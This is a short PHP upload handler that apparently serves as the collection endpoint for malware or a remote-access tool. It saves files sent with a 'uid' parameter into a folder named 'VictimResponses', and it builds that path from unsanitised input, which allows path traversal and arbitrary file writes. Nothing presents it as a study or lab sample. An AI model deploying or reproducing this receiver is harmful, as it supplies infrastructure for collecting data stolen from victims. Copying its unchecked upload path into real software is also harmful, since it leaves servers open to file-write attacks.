<?php
	if(isset($_GET["uid"])) {
		$uid=$_GET["uid"];
		print_r($_FILES);
		move_uploaded_file($_FILES["file"]["tmp_name"],"VictimResponses/$uid/tmp");
	}
?>